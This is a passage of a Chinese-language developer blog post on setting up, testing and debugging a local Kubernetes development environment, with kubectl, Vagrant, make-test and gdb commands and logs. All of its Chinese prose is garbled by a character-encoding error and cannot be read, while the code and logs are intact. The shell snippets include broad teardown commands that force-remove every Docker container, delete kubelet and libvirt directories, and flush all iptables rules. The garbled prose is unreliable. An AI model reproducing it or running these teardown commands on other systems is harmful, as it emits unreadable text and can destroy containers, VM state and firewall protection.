9a15e39d0db8 3 months ago 5.126 MBgcr.io/google_containers/pause-amd64 3.0 99e59f495ffa 4 months ago 746.9 kBgcr.io/google_containers/etcd-amd64 2.2.5 72bd8a257d7a 5 months ago 30.45 MB testingåœ¨å…¶ä¸­å¼€å§‹ä¸€ä¸ª kube-ui éƒ¨ç½²ã€‚ 123456789101112131415161718192021$ sudo dnf install kubernetes-client -y # å®‰è£…å‘½ä»¤è¡Œå·¥å…·$ kubectl cluster-infoKubernetes master is running at http://localhost:8080KubeDNS is running at http://localhost:8080/api/v1/proxy/namespaces/kube-system/services/kube-dnskubernetes-dashboard is running at http://localhost:8080/api/v1/proxy/namespaces/kube-system/services/kubernetes-dashboard$ kubectl get nodeNAME STATUS AGE127.0.0.1 Ready 2m$ sudo docker pull gcr.io/google_containers/kube-ui:v5 # æŠŠé•œåƒæ‹‰å›æ¥, é¿å…ä¸‹ä¸€æ¡æŒ‡ä»¤çš„æ¼«é•¿ç­‰å¾…Trying to pull repository gcr.io/google_containers/kube-ui ... v5: Pulling from gcr.io/google_containers/kube-uia3ed95caeb02: Pull complete 71c3140c0e84: Pull complete Digest: sha256:2165d142900fefb3605533e649de5f0276e82697dc548b5a60e1a455b1cf20ffStatus: Downloaded newer image for gcr.io/google_containers/kube-ui:v5$ kubectl -s http://localhost:8080 run kube-ui --image=gcr.io/google_containers/kube-ui:v5 --port=80deployment &quot;kube-ui&quot; created è®¿é—® http://master_node_ip:8080&#x2F;ui. è¿™æ—¶å€™ä½ åˆæ­¥æ¥è§¦å®Œæˆäº†ä½ å‡†å¤‡æŠŠç¯å¢ƒè¿˜åŸ (ä¿ç•™é•œåƒ). 12$ for ((i=0; i&lt;2; i++)); do docker rm -f `docker ps -qa`; done$ for i in $(mount | grep kube | cut -d&#x27; &#x27; -f 3-3 | tr &#x27; &#x27; &#x27; &#x27;); do umount $i; done &amp;&amp; rm -rf /var/lib/kubelet/ 0x22 by vagrant[^vagrant]è¿™ä¸ªæ–¹æ³• k8s å¼€å‘è€…å¸¸ç”¨çš„éƒ¨ç½²æ–¹æ³•ä¹‹ä¸€ â€“ åœ¨æœ¬åœ°åˆ›å»ºåŸºäºè™šæ‹Ÿæœºçš„é›†ç¾¤ã€‚æºç çš„å®‰è£…ä¸ªäººå–œæ¬¢go get github.com/kubernetes/kubernetesæ–¹å¼æ‹‰ä»£ç å›æ¥ã€‚å…³äºäºŒè¿›åˆ¶éƒ¨ç½²å®‰åˆ© NFS æ–¹æ³•ï¼Œnfs å¯¹æ¯”é»˜è®¤çš„ rsync, ä½¿ç”¨ nfs å»ºç«‹é›†ç¾¤é€Ÿåº¦å¿«ï¼ŒèŠ‚çº¦ç£ç›˜ç©ºé—´ (æˆ‘é‡åˆ°ç£ç›˜ 100%). å¦‚æœä½  (æ¯”å¦‚æˆ‘æ‰‹è´±) æ“ä½œå¤±è¯¯è¯¯åˆ /var/lib/libvirt, éœ€è¦ä¸‹é¢çš„æŒ‡ä»¤æ¥é‡æ–°åˆ›å»º default-pool. 1234567891011# virsh pool-define /dev/stdin &lt;&lt;EOF&lt;pool type=&#x27;dir&#x27;&gt; &lt;name&gt;default&lt;/name&gt; &lt;target&gt; &lt;path&gt;/var/lib/libvirt/images&lt;/path&gt; &lt;/target&gt;&lt;/pool&gt;EOF# virsh pool-start default# virsh pool-autostart default é€šè¿‡é¡¹ç›®è‡ªå·±å¸¦çš„è„šæœ¬éƒ¨ç½²çš„è„šæœ¬å¤§ä½“è½®å»“æ˜¯ä¸‹é¢è¿™æ ·ï¼Œè‡³äºä¸ºä»€ä¹ˆè°ƒç”¨é‚£ä¹ˆå¤šrm -rfæ˜¯å› ä¸ºæˆ‘æ˜¯å¤„å¥³åº§å–œæ¬¢æ¯ä¸€æ¬¡çš„ master èŠ‚ç‚¹éƒ½æ˜¯ 1,node æ˜¯ 2 ä¾æ¬¡æ’åˆ—ä¸‹å»ã€‚å¯ä»¥é€šè¿‡dnf install vagrant-libvirt redhat-lsb-cxx redhat-rpm-config-41-2 -y &amp;&amp; vagrant plugin install vagrant-proxyconfå®‰è£… vagrant å’Œä¸€ä¸ªä»£ç†æ’ä»¶ã€‚ 123456789101112131415161718192021222324252627282930313233#!/bin/bashexport KUBERNETES_PROVIDER=vagrantexport KUBERNETES_VAGRANT_USE_NFS=trueexport VAGRANT_HTTP_PROXY=http:/username:password@10.0.58.88:8080export VAGRANT_HTTPS_PROXY=http://username:password@10.0.58.88:8080iptables -Xiptables -Fiptables -Zinstall() &#123; rpm -qa | grep vagrant-libvirt if [ $? != 0 ]; then dnf install vagrant-libvirt -y fi vagrant plugin install vagrant-proxyconf # è®© vagrant æ”¯æŒçš„ä»£ç†çš„æ’ä»¶ pushd $GOPATH/src/github.com/kubernetes/kubernetes ./cluster/kube-up.sh popd&#125;remove() &#123; sudo virsh destroy kubernetes_master sudo virsh destroy kubernetes_node-1 sudo virsh undefine kubernetes_master sudo virsh undefine kubernetes_node-1 sudo rm -rf /var/lib/libvirt/images/kubernetes_* sudo rm -rf /var/lib/libvirt/qemu/ sudo rm -rf /var/lib/libvirt/dnsmasq/ sudo systemctl restart libvirtd.service&#125;$1 åœ¨ä½¿ç”¨é¡¹ç›®åœ¨è‡ªå¸¦è„šæœ¬å»å»ºç«‹é›†ç¾¤æ—¶æƒ³åœ¨è™šæ‹ŸæœºèŠ‚ç‚¹é‡Œé¢é¢„é…ç½®ä¸œè¥¿ (å¦‚:dnf ä»£ç†ï¼Œç¯å¢ƒå˜é‡) å¯ä»¥åˆ‡åˆ°/var/lib/libvirt/images, åˆ°è¿™é‡Œçœ‹è§é•œåƒæ¨¡æ¿ï¼ŒèŠ‚ç‚¹éƒ½æ˜¯åŸºäºè¿™ä¸ªé•œåƒåšå·®å¼‚ç”Ÿæˆçš„ï¼Œå¯ä»¥qemu-system-x86_64 kube-fedora23_vagrant_box_image_0.imgå¯åŠ¨å®ƒï¼Œæ‰‹å·¥ä¿®æ”¹é…ç½®åå…³æœºã€‚(å¦‚æœåœ¨ nfs æŒ‚è½½æ—¶å€™ hang ä½äº†ï¼Œå¤šæ•°å¯èƒ½æ˜¯é˜²ç«å¢™é—®é¢˜è®°å¾—æ¸…ç†ä¸€ä¸‹). è™½ç„¶åˆå§‹åŒ–ä¸¤ä¸ªèŠ‚ç‚¹èµ·æ¥æˆåŠŸäº†ï¼Œä½†æ˜¯ k8s é›†ç¾¤å¹¶æ²¡æœ‰èµ·æ¥ï¼Œçœ‹ä¸Šé¢å›¾ç‰‡æ˜¾ç¤ºéœ€è¦è‡ªå·± make ä¸€ä¸ª release å‡ºæ¥ï¼Œåœ¨å¼€å‘æœºå™¨ä¸Šè¿›å…¥ repo çš„ç›®å½•sudo make quick-release, è¿‡åé‡æ–°è·‘ä»¥ä¸Šè„šæœ¬ï¼Œç„¶åå¤§ä½“ä¸Šçœ‹åˆ°ä¸‹é¢è¿™ä¸ªå°±ç®—å¼€å‘ç¯å¢ƒéƒ¨ç½²èµ·æ¥äº†ï¼Œè¿™æ—¶å€™ repo ä¸‹é¢æœ‰ä¸ª vagrant ç”Ÿæˆçš„ç›®å½•é‡Œé¢è®°å½•è¿™èŠ‚ç‚¹ä¸€äº›ä¿¡æ¯ï¼Œåªæœ‰åœ¨å½“å‰ç›®å½•vagrant ssh masteræ‰èƒ½æœ‰æ•ˆã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546This can take some time based on your network, disk, and cpu speed.It is possible for an error to occur during Salt provision of cluster and this could loop forever.Validating masterValidating node-1..............................................Waiting for each node to be registered with cloud providerFlag --api-version has been deprecated, flag is no longer respected and will be deleted in the next releaseValidating we can run kubectl commands.Connection to 192.168.121.223 closed.Kubernetes cluster is running.The master is running at: https://10.245.1.2Administer and visualize its resources using Cockpit: https://10.245.1.2:9090For more information on Cockpit, visit http://cockpit-project.orgThe user name and password to use is located in /root/.kube/config... calling validate-clusterFound 1 node(s).NAME STATUS AGEkubernetes-node-1 Ready 6mCluster not working yet.Validate output:NAME STATUS MESSAGE ERRORscheduler Healthy ok controller-manager Healthy ok etcd-1 Healthy &#123;&quot;health&quot;: &quot;true&quot;&#125; etcd-0 Healthy &#123;&quot;health&quot;: &quot;true&quot;&#125; Cluster validation succeededDone, listing cluster services:Kubernetes master is running at https://10.245.1.2Heapster is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/heapsterKubeDNS is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/kube-dnskubernetes-dashboard is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/kubernetes-dashboardGrafana is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/monitoring-grafanaInfluxDB is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/monitoring-influxdbTo further debug and diagnose cluster problems, use &#x27;kubectl cluster-info dump&#x27;. kube-pushè„šæœ¬çš„å·¥ä½œå®åœ¨æ˜¯å¤ªæ…¢äº†ï¼Œå› ä¸ºç”¨kube-upè‡ªåŠ¨åˆ›å»ºé›†ç¾¤å‰å·²ç»å£°æ˜ä½¿ç”¨ NFS åšå…±äº«äº†ï¼Œåœ¨èŠ‚ç‚¹çš„/vagrantå¯ä»¥çœ‹è§å¼€å‘æœºä¸Šé¢çš„ repo ç›®å½•ã€‚ 12345678910111213141516171819202122232425262728293031323334353637[root@localhost kubernetes]# free -m total used free shared buff/cache availableMem: 31966 3763 6175 4 22027 27757Swap: 15999 0 15999[root@localhost kubernetes]# lscpu Architecture: x86_64CPU op-mode(s): 32-bit, 64-bitByte Order: Little EndianCPU(s): 8On-line CPU(s) list: 0-7Thread(s) per core: 2Core(s) per socket: 4Socket(s): 1NUMA node(s): 1Vendor ID: GenuineIntelCPU family: 6Model: 58Model name: Intel(R) Core(TM) i7-3770 CPU @ 3.40GHzStepping: 9CPU MHz: 1603.046CPU max MHz: 3900.0000CPU min MHz: 1600.0000BogoMIPS: 6783.90Virtualization: VT-xL1d cache: 32KL1i cache: 32KL2 cache: 256KL3 cache: 8192KNUMA node0 CPU(s): 0-7...[root@localhost kubernetes]# time ./cluster/kube-push.sh...real 52m8.300suser 0m6.753ssys 0m0.856s 0x30 the network of k8sk8s é‡‡ç”¨æ‰å¹³åŒ–çš„ç½‘ç»œæ¨¡å‹ï¼Œæ¯ä¸ª pod éƒ½æœ‰ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„ ip,pod ä¹‹é—´å¯ä»¥è·¨ä¸»æœºé€šä¿¡ï¼Œç›¸æ¯”äº Docker åŸç”Ÿçš„ NAT æ–¹å¼æ¥è¯´ï¼Œè¿™æ ·ä½¿å¾—å®¹å™¨åœ¨ç½‘ç»œå±‚é¢æ›´åƒè™šæ‹Ÿæœºæˆ–è€…ç‰©ç†æœºï¼Œå¤æ‚åº¦æ•´ä½“é™ä½ï¼Œæ›´åŠ å®¹æ˜“å®ç°æœåŠ¡å‘ç°ï¼Œè¿ç§»ï¼Œè´Ÿè½½å‡è¡¡ç­‰åŠŸèƒ½ã€‚ä¸ºäº†å®ç°è¿™ä¸ªç›®æ ‡ k8s ç½‘ç»œå®Œæˆçš„å·¥ä½œå¦‚ä¸‹ï¼š ç´§è€¦åˆçš„å®¹å™¨ä¹‹é—´é€šä¿¡ï¼Œé€šè¿‡ pod å’Œ localhost è®¿é—®è§£å†³ã€‚ pod ä¹‹é—´é€šä¿¡ï¼Œå»ºç«‹é€šä¿¡å­ç½‘ï¼Œæ¯”å¦‚éš§é“ï¼Œè·¯ç”±ï¼ŒFlannel,Open vSwitch, Weave. pod å’Œ service, ä»¥åŠå¤–éƒ¨ç³»ç»Ÿå’Œ Service çš„é€šä¿¡ï¼Œå¼•å…¥ Service è§£å†³ã€‚ Kubernetes çš„ç½‘ç»œä¼šç»™æ¯ä¸ª Pod åˆ†é…ä¸€ä¸ª IP åœ°å€ï¼Œä¸éœ€è¦åœ¨ Pod ä¹‹é—´å»ºç«‹é“¾æ¥ï¼Œä¹ŸåŸºæœ¬ä¸éœ€è¦å»å¤„ç†å®¹å™¨å’Œä¸»æœºä¹‹é—´çš„ç«¯å£æ˜ å°„ã€‚æ³¨æ„ï¼špod é‡å»ºåï¼ŒIP ä¼šè¢«é‡æ–°åˆ†é…ï¼Œæ‰€ä»¥å†…ç½‘é€šä¿¡ä¸è¦ä¾èµ– Pod IP; é€šè¿‡ Service ç¯å¢ƒå˜é‡æˆ–è€… DNS è§£å†³ã€‚ 0x40 testing in k8såœ¨å‘ pr å‰ä½ éœ€è¦ç¡®è®¤ä½ çš„ä¿®æ”¹è‡³å°‘é€šè¿‡äº†å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•ï¼Œå¦‚æœè¦æƒ³è¢«åˆå¹¶è¿˜è¦é€šè¿‡ç«¯åˆ°ç«¯çš„æµ‹è¯•ä¹Ÿæ˜¯å¿…é¡»çš„ã€‚æµ‹è¯•çš„ä»£ç ç»„ç»‡æ˜¯åˆ©ç”¨ golang çš„ testing. 0x41 unit testingä½ å¯ä»¥åœ¨å•å…ƒæµ‹è¯•æœŸé—´ä½¿ç”¨KUBE_GOFLAGSå˜é‡æ¥è®¾ç½® go flags.è¿è¡Œå…¨éƒ¨çš„å•å…ƒæµ‹è¯•ã€‚ 12cd kubernetesmake test # Run all unit tests. è¿è¡Œå•ä¸ªåŒ…æˆ–è€…å¤šä¸ªçš„å•å…ƒæµ‹è¯•ã€‚ 12make test WHAT=pkg/api # run tests for pkg/apimake test WHAT=&quot;pkg/api pkg/kubelet&quot; # run tests for pkg/api and pkg/kubelet å¯¹åŒ…é‡Œé¢å…·ä½“å‚æ•°çš„å•å…ƒæµ‹è¯•ã€‚ 12345# Runs TestValidatePod in pkg/api/validation with the verbose flag setmake test WHAT=pkg/api/validation KUBE_GOFLAGS=&quot;-v&quot; KUBE_TEST_ARGS=&#x27;-run ^TestValidatePod$&#x27;# Runs tests that match the regex ValidatePod|ValidateConfigMap in pkg/api/validationmake test WHAT=pkg/api/validation KUBE_GOFLAGS=&quot;-v&quot; KUBE_TEST_ARGS=&quot;-run ValidatePod\\|ValidateConfigMap$&quot; åå¤è¿è¡Œå•å…ƒæµ‹è¯• 12# Have 2 workers run all tests 5 times each (10 total iterations).make test PARALLEL=2 ITERATION=5 Unit test coverageè·å–æµ‹è¯•è¦†ç›–ç‡ï¼Œä»¥ä¸‹å‘½ä»¤ä¼šç”Ÿæˆä¸€ä¸ª html æ–‡æ¡£ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å¯¹ä¸€ä¸ª package åšè¿™æ ·çš„æ“ä½œã€‚ 12make test KUBE_COVER=ymake test WHAT=pkg/kubectl KUBE_COVER=y Benchmark unit testså…¸å‹çš„ benchmark æŒ‡ä»¤å¦‚ä¸‹ï¼š 1go test ./pkg/apiserver -benchmem -run=XXX -bench=BenchmarkWatch å…¶ä¸­ï¼š -run&#x3D;XXX æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼è¿‡æ»¤å‡º test case æ¥è¿è¡Œã€‚ -bench&#x3D;BenchmarkWatch å°†ä¼šè¿è¡Œ BenchmarkWatch ä¸­çš„æµ‹è¯•ï¼Œå‚è€ƒgrep -nr BenchmarkWatch . -benchmem å¯ç”¨å†…å­˜åˆ†é…çŠ¶æ€ 0x42 Integration tests é›†æˆæµ‹è¯•ä»…æ”¹è®¿é—®æœ¬åœ°çš„èµ„æº æœ€æ™®éçš„ etcd æˆ–è€…æœåŠ¡éƒ½åº”è¯¥åœ¨æœ¬åœ°ã€‚ æ‰€æœ‰é‡å¤§çš„ç‰¹æ€§éƒ½ä¾èµ–é›†æˆæµ‹è¯• åŒ…æ‹¬ kubectl è¿™ä¸ªå‘½ä»¤è¡Œå·¥å…·ã€‚ é¦–é€‰çš„æµ‹è¯•å¤šåœºæ™¯çš„æˆ–è¾“å…¥çš„æ–¹æ³•æ˜¯ TableDrivenTests Example: TestNamespaceAuthorization æ¯ä¸€ä¸ªæµ‹è¯•éƒ½åº”åˆ›å»ºè‡ªå·±çš„ master,http server å’Œ config. Example: TestPodUpdateActiveDeadlineSeconds å®‰è£… etcdk8s çš„é›†æˆæµ‹è¯•éœ€è¦ä½ çš„PATHé‡Œé¢æœ‰ etcd. 12345678910# Install etcd and add to PATH# Option a) install inside kubernetes roothack/install-etcd.sh # Installs in ./third_party/etcdecho export PATH=&quot;$PATH:$(pwd)/third_party/etcd&quot; &gt;&gt; ~/.profile # Add to PATH# Option b) install manuallygrep -E &quot;image.*etcd&quot; cluster/saltbase/etcd/etcd.manifest # Find version# Install that version using yum/apt-get/etcecho export PATH=&quot;$PATH:&lt;LOCATION&gt;&quot; &gt;&gt; ~/.profile # Add to PATH è®¸å¤šæµ‹è¯•ä¼šåœ¨å†…éƒ¨å¼€å§‹ä¸€ä¸ª etcd æœåŠ¡ï¼Œå­˜å‚¨æµ‹è¯•æ•°æ®åœ¨æ“ä½œç³»ç»Ÿçš„ä¸´æ—¶æ–‡ä»¶ç›®å½•ï¼Œå¦‚æœä½ çœ‹è§æ˜¯å› ä¸ºæ²¡æœ‰è¶³å¤Ÿç£ç›˜æˆ–è€…ä¸€ä¸ª volume ä¸å¯é¢„çŸ¥çš„å†™å»¶è¿Ÿå¯¼è‡´çš„test failures, å¯ä»¥ç”¨TEST_ETCD_DIRç¯å¢ƒå˜é‡æ¥è¦†ç›–æ‰é»˜è®¤çš„å†™ä½ç½®ã€‚ è¿è¡Œé›†æˆæµ‹è¯•1make test-integration # Run all integration tests. è¿™ä¸ªè„šæœ¬ä¼šè¿è¡Œtest/integrationä¸­çš„æµ‹è¯•è„šæœ¬ã€‚ 1make test-integration KUBE_GOFLAGS=&quot;-v&quot; KUBE_TEST_ARGS=&quot;-run ^TestPodUpdateActiveDeadlineSeconds$&quot; å¯ä»¥åˆ©ç”¨KUBE_TEST_ARGSå˜é‡ä¸ hack &#x2F;test-integration.sh è„šæœ¬æ¥è¿è¡Œå…·ä½“çš„é›†æˆæµ‹è¯•ï¼Œä¸Šé¢çš„æ˜¯ä¾‹å­ã€‚ä¸è¿‡KUBE_TEST_ARGSå˜é‡è¢«è®¾ç½®è¿‡åï¼Œé‚£ä¹ˆ test case å°†åªä¼šåœ¨ v1 ç‰ˆæœ¬çš„ api ä¸Šè·‘ä¸”watch cachecase å°†ä¼šè¢«è·³è¿‡ã€‚ 0x43 end-to-end testsk8s çš„ç«¯åˆ°ç«¯æµ‹è¯•æä¾›äº†ä¸€ä¸ªæµ‹è¯•ç³»ç»Ÿä¸­ç«¯åˆ°ç«¯è¡Œä¸ºçš„æœºåˆ¶ï¼Œä¹Ÿæ˜¯ç¡®è®¤ç”¨æˆ·æ“ä½œæ˜¯å¦ç¬¦åˆå¼€å‘è€…çš„è§„èŒƒçš„æœ€åä¸€ä¸ªä¿¡å·ï¼Œå°½ç®¡å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•æä¾›äº†ä¸é”™çš„ä¿¡å·ã€‚ç°å®æ˜¯åƒ Kubernetes åˆ†å¸ƒå¼ç³»ç»Ÿçš„æƒ…å†µå¹¶ä¸å°‘è§é—®é¢˜æ˜¯ â€“ å¾®å°çš„å˜åŒ–å¯èƒ½ä¼šé€šè¿‡æ‰€æœ‰å•å…ƒæµ‹è¯•å’Œé›†æˆæµ‹è¯•ï¼Œä½†åœ¨ç³»ç»Ÿå±‚é¢å¯¼è‡´äº†ä¸å¯é¢„è§çš„å˜åŒ–ï¼Œç«¯åˆ°ç«¯çš„æµ‹è¯•å¼¥è¡¥äº†å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•åœ¨è¿™æ–¹é¢çš„ä¸è¶³ï¼Œå®ƒçš„ç›®æ ‡æ˜¯ç¡®è®¤åŸºäº k8s ä»£ç çš„ä¸€è‡´ä¸å¯é çš„è¡Œä¸ºï¼Œå¹¶åœ¨ç”¨æˆ·æ¥è§¦å‰æ•è·åˆ°éš¾ä»¥æµ‹è¯•çš„ bug. åœ¨ k8s çš„ç«¯åˆ°ç«¯çš„æµ‹è¯•æ„å»ºåŸºäº Ginkgo ä¸ Gomega, å®ƒä»¬æ˜¯ (Behavior-Driven Development (BDD) )[^BDD] æµ‹è¯•æ¡†æ¶ï¼Œåœ¨æ²‰æµ¸è¿›æµ‹è¯•ä»£ç å‰å»ºè®®å…ˆé˜…è¯»æ–‡æ¡£ã€‚ å…¸å‹ç”¨æ³•å…ˆæŠŠç¯å¢ƒå‡†å¤‡ä¸€ä¸‹ï¼š 123export KUBERNETES_PROVIDER=vagrantexport VAGRANT_DEFAULT_PROVIDER=libvirtgo run hack/e2e.go -v --build --up --test --down è¿è¡Œä¸‹é¢ä»»ä¸€æŒ‡ä»¤ä¹‹ä¸€ï¼š 12345678910111213141516171819202122232425262728293031# Build binaries for testinggo run hack/e2e.go -v --build# Create a fresh cluster. Deletes a cluster first, if it existsgo run hack/e2e.go -v --up# Run all testsgo run hack/e2e.go -v --test# Run tests matching the regex &quot;\\[Feature:Performance\\]&quot;go run hack/e2e.go -v --test --test_args=&quot;--ginkgo.focus=\\[Feature:Performance\\]&quot;# Conversely, exclude tests that match the regex &quot;Pods.*env&quot;go run hack/e2e.go -v --test --test_args=&quot;--ginkgo.skip=Pods.*env&quot;# Run tests in parallel, skip any that must be run seriallyGINKGO_PARALLEL=y go run hack/e2e.go --v --test --test_args=&quot;--ginkgo.skip=\\[Serial\\]&quot;# Flags can be combined, and their actions will take place in this order:# --build, --up, --test, --down## You can also specify an alternative provider, such as &#x27;aws&#x27;## e.g.:KUBERNETES_PROVIDER=aws go run hack/e2e.go -v --build --up --test --down# -ctl can be used to quickly call kubectl against your e2e cluster. Useful for# cleaning up after a failed test or viewing logs. Use -v to avoid suppressing# kubectl output.go run hack/e2e.go -v -ctl=&#x27;get events&#x27;go run hack/e2e.go -v -ctl=&#x27;delete pod foobar&#x27; å¼ºåŠ›æ¸…ç†ï¼šåœ¨è¿è¡ŒæœŸé—´å¯ä»¥C+cå¯ä»¥æ­£ç¡®çš„å…³é—­ï¼Œä½†æ˜¯å¦‚æœå‡ºç°ä»€ä¹ˆé”™è¯¯æ—¶å€™å¯ä»¥è¿˜æœ‰è™šæ‹Ÿæœºåœ¨è¿è¡Œè¦è¢«å¼ºåˆ¶æ¸…é™¤å°±ä½¿ç”¨ä¸‹é¢å‘½ä»¤ï¼š 1go run hack/e2e.go -v --down 0x50 debug with developmentæ ¹æ®ç¤¾åŒºæä¾›çš„æ–‡æ¡£ debug çš„æ–¹å¼åº”è¯¥æ˜¯logä¸æˆ‘ä¹‹å‰ç»éªŒæ˜¯ä¸€è‡´çš„ï¼Œgdb å¯¹ go æ”¯æŒå¤ªå¼±äº†å°¤å…¶æ˜¯å¤§å‹é¡¹ç›®ä¸­ã€‚ debug with gdbgdb æ”¯æŒ python å†™çš„æ’ä»¶ï¼Œå¤Ÿä½¿ç”¨è¿™ä¸ªç‰¹ç‚¹è®© gdb æ”¯æŒå…¶ runtime çš„ trace. 123define goruntime source /usr/lib/golang/src/runtime/runtime-gdb.pyend ä½†æ˜¯å®è·µç”¨èµ·æ¥æœ‰ç‚¹ç³™ï¼Œå•ç‚¹å…¨æ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œä¸€æŠŠçº¿ç¨‹ï¼Œæ‰‹å·¥è°ƒè¯•ç®€ç›´äº†ï¼Œä¸è¿‡æ“ä½œè¿˜æ˜¯è¿˜æ˜¯ gdb çš„ä¹ æƒ¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677[root@localhost kubernetes]# make WHAT=cmd/kubectl/can&#x27;t load package: package github.com/kubernetes/kubernetes: no buildable Go source files in /root/workspace/go/src/github.com/kubernetes/kubernetes+++ [0929 04:28:33] Generating bindata: /root/workspace/go/src/github.com/kubernetes/kubernetes/test/e2e/framework/gobindata_util.go+++ [0929 04:28:33] Building the toolchain targets: k8s.io/kubernetes/hack/cmd/teststale+++ [0929 04:28:34] Building go targets for linux/amd64: cmd/kubectl/[root@localhost kubernetes]# ./_output/bin/kubectl versionClient Version: version.Info&#123;Major:&quot;1&quot;, Minor:&quot;5+&quot;, GitVersion:&quot;v1.5.0-alpha.0.1361+aa9880fe246a33-dirty&quot;, GitCommit:&quot;aa9880fe246a33356c89567d5ed5b11f22661540&quot;, GitTreeState:&quot;dirty&quot;, BuildDate:&quot;2016-09-29T06:56:41Z&quot;, GoVersion:&quot;go1.6.3&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;&#125;Unable to connect to the server: Service Unavailable[root@localhost kubernetes]# gdb ./_output/bin/kubectl -q(gdb) b kubectl.go:35Breakpoint 1 at 0x46a2a6: file /root/workspace/go/src/github.com/kubernetes/kubernetes/_output/local/go/src/k8s.io/kubernetes/cmd/kubectl/app/kubectl.go, line 35.(gdb) rStarting program: /root/workspace/go/src/github.com/kubernetes/kubernetes/_output/local/bin/linux/amd64/kubectl Missing separate debuginfos, use: dnf debuginfo-install glibc-2.23.1-10.fc24.x86_64[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib64/libthread_db.so.1&quot;.[New Thread 0x7ffff77fa700 (LWP 4062)][New Thread 0x7ffff6ff9700 (LWP 4063)][New Thread 0x7ffff67f8700 (LWP 4064)][New Thread 0x7ffff5ff7700 (LWP 4065)][New Thread 0x7ffff57f6700 (LWP 4066)][New Thread 0x7ffff4c83700 (LWP 4067)][New Thread 0x7fffe7fff700 (LWP 4068)][New Thread 0x7fffe77fe700 (LWP 4069)][New Thread 0x7fffe6ffd700 (LWP 4071)][New Thread 0x7fffe67fc700 (LWP 4074)][New Thread 0x7fffe5ffb700 (LWP 4075)][New Thread 0x7fffe57fa700 (LWP 4076)]Thread 1 &quot;kubectl&quot; hit Breakpoint 1, k8s.io/kubernetes/cmd/kubectl/app.Run (~r0=...) at /root/workspace/go/src/github.com/kubernetes/kubernetes/_output/local/go/src/k8s.io/kubernetes/cmd/kubectl/app/kubectl.go:3535 defer logs.FlushLogs()(gdb) list 30 WARNING: this logic is duplicated, with minor changes, in cmd/hyperkube/kubectl.go31 Any salient changes here will need to be manually reflected in that file.32 */33 func Run() error &#123;34 logs.InitLogs()35 defer logs.FlushLogs()3637 cmd := cmd.NewKubectlCommand(cmdutil.NewFactory(nil), os.Stdin, os.Stdout, os.Stderr)38 return cmd.Execute()39 &#125;(gdb) bt#0 k8s.io/kubernetes/cmd/kubectl/app.Run (~r0=...) at /root/workspace/go/src/github.com/kubernetes/kubernetes/_output/local/go/src/k8s.io/kubernetes/cmd/kubectl/app/kubectl.go:35#1 0x00000000004019d8 in main.main () at /root/workspace/go/src/github.com/kubernetes/kubernetes/_output/local/go/src/k8s.io/kubernetes/cmd/kubectl/kubectl.go:26(gdb) info goroutines * 1 running runtime.systemstack_switch* 17 syscall runtime.goexit 2 waiting runtime.gopark 18 waiting runtime.gopark 19 waiting runtime.gopark 24 waiting runtime.gopark* 34 syscall runtime.notetsleepg 25 waiting runtime.gopark 26 waiting runtime.gopark 27 waiting runtime.gopark 28 waiting runtime.gopark 29 waiting runtime.gopark* 30 running runtime.systemstack_switch 31 waiting runtime.gopark 32 waiting runtime.gopark* 4 syscall runtime.notetsleepg 13 waiting runtime.gopark(gdb) goroutine 2 bt#0 runtime.gopark (unlockf=&#123;void (runtime.g *, void *, bool *)&#125; 0xc820028758, lock=0x39fb5e0 &lt;runtime.forcegc&gt;, reason=&quot;force gc (idle)&quot;, traceEv=20 &#x27;\\024&#x27;, traceskip=1) at /usr/lib/golang/src/runtime/proc.go:263#1 0x000000000042eca4 in runtime.goparkunlock (lock=0x39fb5e0 &lt;runtime.forcegc&gt;, reason=&quot;force gc (idle)&quot;, traceEv=20 &#x27;\\024&#x27;, traceskip=1) at /usr/lib/golang/src/runtime/proc.go:268#2 0x000000000042e9e8 in runtime.forcegchelper () at /usr/lib/golang/src/runtime/proc.go:229#3 0x000000000045ea51 in runtime.goexit () at /usr/lib/golang/src/runtime/asm_amd64.s:1998#4 0x0000000000000000 in ?? () debug with logç¤¾åŒº debug æ˜¯ä½¿ç”¨glogåŒ…é æ‰“å° log æ¥ debug, å…¶å®è¿™æ ·æ˜¯ go ç¼–ç¨‹æ’é”™éå¸¸å¥½çš„å®è·µ.go æ˜¯é¢å‘å¹¶å‘ç¼–ç¨‹çš„ï¼Œç”¨ gdb è¿™æ ·çš„å·¥å…·å»è°ƒè¯•å¤§é‡çš„çº¿ç¨‹æ˜¯ä¸äººé“çš„ã€‚ é‡ç‚¹æ˜¯ -v: As per the comments, the practical default level is V(2). Developers and QE environments may wish to run at V(3) or V(4). If you wish to change the loglevel, you can pass in -v=X where X is the desired maximum level to log. è¿™æ˜¯å¼€å‘å¯¹ glog çš„ conventions. glog.Errorf() - Always an error glog.Warningf() - Something unexpected, but probably not an error glog.Infof() has multiple levels: glog.V(0) - Generally useful for this to ALWAYS be visible to an operator Programmer errors Logging extra info about a panic CLI argument handling glog.V(1) - A reasonable default log level if you donâ€™t want verbosity. Information about config (listening on X, watching Y) Errors that repeat frequently that relate to conditions that can be corrected (pod detected as unhealthy) glog.V(2) - Useful steady state information about the service and important log messages that may correlate to significant changes in the system. This is the recommended default log level for most systems. Logging HTTP requests and their exit code System state changing (killing pod) Controller state change events (starting pods) Scheduler log messages glog.V(3) - Extended information about changes More info about system state changes glog.V(4) - Debug level verbosity (for now) Logging in particularly thorny parts of code where you may want to come back later and check it [^officialdoc]: official doc[^slideshare]: slideshare[^design]: k8s design[^term]: k8s term[^vagrant]: docs&#x2F;devel&#x2F;local-cluster&#x2F;vagrant[^networking]: docs&#x2F;design&#x2F;networking[^debug]: docs&#x2F;devel&#x2F;logging[^hangon]: network hangon[^devel_guide]: 